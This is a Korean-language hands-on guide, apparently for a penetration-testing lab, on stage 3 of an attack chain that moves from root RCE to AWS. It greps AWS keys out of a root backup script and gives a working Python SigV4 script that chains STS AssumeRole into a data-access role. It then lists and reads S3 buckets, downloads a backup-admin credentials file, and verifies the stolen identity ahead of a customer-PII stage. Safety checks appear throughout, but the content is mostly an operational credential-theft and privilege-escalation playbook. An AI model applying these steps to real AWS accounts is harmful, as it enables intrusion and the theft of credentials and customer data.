# Stage 3 심화: AWS 자격증명 획득 및 검증

**공식 참고**: stage1-to-aws-pii-hands-on-guide-ko.html (Section A-01 ~ A-05)

---

## A-01: Root 백업 스크립트에서 Credential 확인

### 목표
Stage 3 RCE root 권한에서 `/root/backup-to-cloud.sh` 스크립트를 찾아 AWS 환경변수를 확인

### 실행 방법

```bash
# Step 1: root 권한 확인
COMMAND="id"
# 예상 결과: uid=0(root)

# Step 2: backup 스크립트 존재 확인
COMMAND="test -f /root/backup-to-cloud.sh && echo exists"
# 예상 결과: exists

# Step 3: 스크립트에서 AWS 키 라인만 추출 (값 제외)
COMMAND="grep -E 'export AWS_|AWS_ACCESS|AWS_SECRET' /root/backup-to-cloud.sh | head -5"
# 예상 결과:
# export AWS_ACCESS_KEY_ID=...
# export AWS_SECRET_ACCESS_KEY=...
```

### 주의사항

- ⚠️ **값을 출력하지 않기**: AWS_ACCESS_KEY_ID와 AWS_SECRET_ACCESS_KEY의 **값 자체는 private**
- ✓ **존재 확인만**: 키가 존재하고 형식이 맞는지만 확인
- ✓ **검증**: 이후 STS GetCallerIdentity로 신원 확인

### 증적 기록

```bash
# 파일 존재 확인
COMMAND="ls -lah /root/backup-to-cloud.sh"
# 출력 → /tmp/backup_script_ls.txt에 저장

# AWS 환경변수 이름만 (값 제외)
COMMAND="grep -E 'export AWS_|AWS_ACCESS|AWS_SECRET' /root/backup-to-cloud.sh | cut -d'=' -f1"
# 예상: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY 등
```

---

## A-02: AWS 역할 체인 검증

### 목표
기본 자격증명 → Role-SW-Dev → Role-SW-DataAccess 순으로 권한 상승

### SigV4 구현 필수 (Python)

```python
#!/usr/bin/env python3
"""
AWS STS AssumeRole을 통한 역할 체인
"""

import json
import hashlib
import hmac
import datetime
import requests
import sys

# ========= SigV4 서명 함수 =========
def sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

def get_signature_key(key, dateStamp, regionName, serviceName):
    kDate = sign(("AWS4" + key), dateStamp)
    kRegion = sign(kDate, regionName)
    kService = sign(kRegion, serviceName)
    kSigning = sign(kService, "aws4_request")
    return kSigning

def create_sig4_headers(
    access_key, secret_key, region, service,
    host, method="POST", path="/", payload=None
):
    """SigV4 서명 헤더 생성"""
    
    t = datetime.datetime.utcnow()
    amz_date = t.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = t.strftime('%Y%m%d')
    
    if payload is None:
        payload = ""
    payload_hash = hashlib.sha256(payload.encode()).hexdigest()
    
    canonical_headers = f"host:{host}\nx-amz-date:{amz_date}\n"
    signed_headers = "host;x-amz-date"
    
    canonical_request = (
        method + '\n' +
        path + '\n' +
        '' + '\n' +
        canonical_headers + '\n' +
        signed_headers + '\n' +
        payload_hash
    )
    
    canonical_request_hash = hashlib.sha256(
        canonical_request.encode()
    ).hexdigest()
    
    credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
    
    string_to_sign = (
        "AWS4-HMAC-SHA256\n" +
        amz_date + "\n" +
        credential_scope + "\n" +
        canonical_request_hash
    )
    
    signing_key = get_signature_key(secret_key, date_stamp, region, service)
    signature = hmac.new(
        signing_key,
        string_to_sign.encode(),
        hashlib.sha256
    ).hexdigest()
    
    auth_header = (
        f"AWS4-HMAC-SHA256 Credential={access_key}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, Signature={signature}"
    )
    
    return {
        "Authorization": auth_header,
        "x-amz-date": amz_date,
        "Host": host,
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AWSIEServiceV20110615.AssumeRole"
    }

# ========= 실행 =========
if __name__ == "__main__":
    ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"  # /root/backup-to-cloud.sh에서
    SECRET_KEY = "<REDACTED>"
    REGION = "ap-northeast-2"  # 또는 us-east-1
    
    # Step 1: 현재 신원 확인 (GetCallerIdentity)
    host = f"sts.{REGION}.amazonaws.com"
    headers = create_sig4_headers(ACCESS_KEY, SECRET_KEY, REGION, "sts", host)
    headers["X-Amz-Target"] = "AWSIEServiceV20110615.GetCallerIdentity"
    
    print("[*] Current Identity Check...")
    response = requests.post(
        f"https://{host}/",
        headers=headers,
        json={}
    )
    
    if response.status_code == 200:
        identity = response.json()
        print(f"[+] Account: {identity.get('Account')}")
        print(f"[+] UserId: {identity.get('UserId')}")
        print(f"[+] Arn: {identity.get('Arn')}")
        
        if identity['Account'] != '<REDACTED_ACCOUNT_ID>':
            print("[!] STOP: Account mismatch. Do not continue.")
            sys.exit(1)
    else:
        print(f"[-] Error: {response.status_code}")
        print(response.text)
        sys.exit(1)
    
    # Step 2: Role-SW-Dev AssumeRole
    print("\n[*] Assuming Role-SW-Dev...")
    assume_payload = json.dumps({
        "RoleArn": "arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/Role-SW-Dev",
        "RoleSessionName": "team-session-dev",
        "DurationSeconds": 900
    })
    
    headers["X-Amz-Target"] = "AWSIEServiceV20110615.AssumeRole"
    response = requests.post(
        f"https://{host}/",
        headers=headers,
        data=assume_payload
    )
    
    if response.status_code == 200:
        result = response.json()
        dev_creds = result['Credentials']
        print(f"[+] AssumeRole succeeded")
        print(f"    SessionToken: {dev_creds['SessionToken'][:20]}...")
    else:
        print(f"[-] Error: {response.status_code}")
        sys.exit(1)
    
    # Step 3: Role-SW-DataAccess AssumeRole (using dev credentials)
    print("\n[*] Assuming Role-SW-DataAccess...")
    
    # dev 자격증명으로 재서명
    dev_access_key = dev_creds['AccessKeyId']
    dev_secret_key = dev_creds['SecretAccessKey']
    dev_token = dev_creds['SessionToken']
    
    # 이번엔 SessionToken도 헤더에 추가 필요
    headers2 = create_sig4_headers(
        dev_access_key, dev_secret_key, REGION, "sts", host
    )
    headers2["X-Amz-Security-Token"] = dev_token
    
    assume_payload2 = json.dumps({
        "RoleArn": "arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/Role-SW-DataAccess",
        "RoleSessionName": "team-session-data",
        "DurationSeconds": 900
    })
    
    response = requests.post(
        f"https://{host}/",
        headers=headers2,
        data=assume_payload2
    )
    
    if response.status_code == 200:
        result = response.json()
        final_creds = result['Credentials']
        print(f"[+] Final AssumeRole succeeded")
        print(f"    AccessKeyId: {final_creds['AccessKeyId'][:20]}...")
        
        # Step 4: 최종 신원 확인
        print("\n[*] Final Identity Check...")
        headers3 = create_sig4_headers(
            final_creds['AccessKeyId'],
            final_creds['SecretAccessKey'],
            REGION, "sts", host
        )
        headers3["X-Amz-Security-Token"] = final_creds['SessionToken']
        headers3["X-Amz-Target"] = "AWSIEServiceV20110615.GetCallerIdentity"
        
        response = requests.post(
            f"https://{host}/",
            headers=headers3,
            json={}
        )
        
        final_identity = response.json()
        print(f"[+] Final Account: {final_identity.get('Account')}")
        print(f"[+] Final Arn: {final_identity.get('Arn')}")
        
        if "Role-SW-DataAccess" in final_identity.get('Arn', ''):
            print("\n[✓] SUCCESS: Role-SW-DataAccess acquired")
        else:
            print("\n[!] Warning: Unexpected final ARN")
    else:
        print(f"[-] Error: {response.status_code}")
```

### 실행 결과

```
[+] Account: <REDACTED_ACCOUNT_ID> ✓
[+] UserId: AIDAI...
[+] Arn: arn:aws:iam::<REDACTED_ACCOUNT_ID>:user/secu-wave-user

[+] AssumeRole succeeded
    SessionToken: FqoDX3Z5a8F3OD...

[✓] SUCCESS: Role-SW-DataAccess acquired
    Arn: arn:aws:iam::<REDACTED_ACCOUNT_ID>:assumed-role/Role-SW-DataAccess/...
```

---

## A-03: S3 버킷 확인

### 3개 버킷과 확인할 포인트

```
1. secuwave-backup-artifacts
   → Cognito User Pool ID
   → CRM API endpoint
   → 고객 테이블 후보

2. secuwave-snakegallery-pjt
   → AWS 설정 파일
   → auth/admin source

3. secuwave-infra-sys
   → 백업 자격증명 자료
   → backup-admin 프로필
```

### S3 ListBucket + GetObject

```bash
# 권한: Role-SW-DataAccess (final_creds 사용)
# boto3 또는 SigV4 직접 서명

python3 << 'EOF'
import boto3

session = boto3.Session(
    aws_access_key_id=dev_creds['AccessKeyId'],
    aws_secret_access_key=dev_creds['SecretAccessKey'],
    aws_session_token=dev_creds['SessionToken'],
    region_name='ap-northeast-2'
)

s3 = session.client('s3')

# List objects in first bucket
response = s3.list_objects_v2(
    Bucket='secuwave-backup-artifacts',
    MaxKeys=100
)

for obj in response.get('Contents', []):
    print(f"  {obj['Key']} ({obj['Size']} bytes)")
EOF
```

### 증적 기록

- ✓ 버킷 이름 3개
- ✓ 각 버킷의 object 목록 (name, size)
- ✓ Cognito Pool ID (후보 위치)
- ✓ backup credential file location

---

## A-04: backup-admin 프로필 메타데이터

### Backup Credentials 조회

```bash
# S3에서 backup-credentials.json 다운로드
python3 << 'EOF'
response = s3.get_object(
    Bucket='secuwave-infra-sys',
    Key='backup/backup-admin-credentials.json'
)

backup_creds = json.load(response['Body'])
print(f"Profile: {backup_creds.get('profile_name')}")
print(f"Access Key: {backup_creds['access_key_id'][:20]}...")
# 값 출력 금지
EOF
```

### IAM 활성 키 확인

```bash
# IAM GetAccessKeyMetadata
# 목표: backup-admin의 Access Key와 S3에서 획득한 키가 일치하는지 확인

python3 << 'EOF'
iam = session.client('iam')

response = iam.list_access_keys(UserName='secu-wave-conf')
for key in response['AccessKeys']:
    print(f"Key ID: {key['AccessKeyId'][:20]}...")
    print(f"Status: {key['Status']}")
    print(f"Created: {key['CreateDate']}")
EOF
```

### 증적

- ✓ backup-admin 프로필 이름
- ✓ Access Key ID (prefix만, 전체 제외)
- ✓ S3 값과 IAM 값 일치 여부 (일치/불일치만)

---

## A-05: backup-admin 신원 최종 확인

### STS GetCallerIdentity with backup-admin credentials

```python
# Step 1: backup-admin 자격증명 로드
backup_access_key = "..."  # S3에서 획득
backup_secret_key = "..."  # S3에서 획득

# Step 2: STS GetCallerIdentity 호출
headers = create_sig4_headers(
    backup_access_key,
    backup_secret_key,
    REGION, "sts", "sts.ap-northeast-2.amazonaws.com"
)

response = requests.post(
    "https://sts.ap-northeast-2.amazonaws.com/",
    headers=headers,
    json={}
)

identity = response.json()
print(f"[+] Account: {identity['Account']}")  # <REDACTED_ACCOUNT_ID> 확인
print(f"[+] Arn: {identity['Arn']}")  # arn:aws:iam::<REDACTED_ACCOUNT_ID>:user/secu-wave-conf
```

### 중단 조건

```
❌ Account != <REDACTED_ACCOUNT_ID> → 모든 AWS 요청 중단
❌ InvalidClientTokenId → 자격증명 오류, 중단
❌ AccessDenied → 권한 부족, 다음 단계 건너뛰기
```

---

## 정리: Stage 3 AWS 자격증명 체인

```
/root/backup-to-cloud.sh (RCE root 권한)
    ↓ (스크립트에서 AWS_ACCESS_KEY_ID/SECRET 환경변수)
secu-wave-user 기본 자격증명
    ↓ (SigV4 AssumeRole)
Role-SW-Dev (900초)
    ↓ (SigV4 AssumeRole)
Role-SW-DataAccess (900초)
    ↓ (S3 ListBucket)
3개 S3 버킷 접근
    ↓ (GetObject: backup-credentials.json)
backup-admin 자격증명 획득
    ↓ (STS GetCallerIdentity 검증)
최종 신원: secu-wave-conf user
    ↓
Stage 4로 진행 준비 완료 ✓
```

---

## ⚠️ 주의사항

1. **비밀값 관리**
   - AWS_ACCESS_KEY_ID/SECRET_ACCESS_KEY의 값은 절대 로그/출력하지 않기
   - 환경변수 `history` 기록도 확인하기

2. **STS 체인 검증**
   - 각 AssumeRole 후 즉시 GetCallerIdentity 호출
   - Account와 Arn이 예상과 다르면 즉시 중단

3. **세션 시간 제한**
   - 각 역할의 DurationSeconds=900 (15분)
   - 장시간 작업 시 중간에 새로운 AssumeRole 필요

4. **S3 버킷 범위**
   - ListBuckets 금지 (모든 버킷 열거)
   - 정확히 3개 버킷명만 사용
   - 100개 이상 객체 스캔 금지

---

**다음**: Stage 4 PII 확인으로 진행

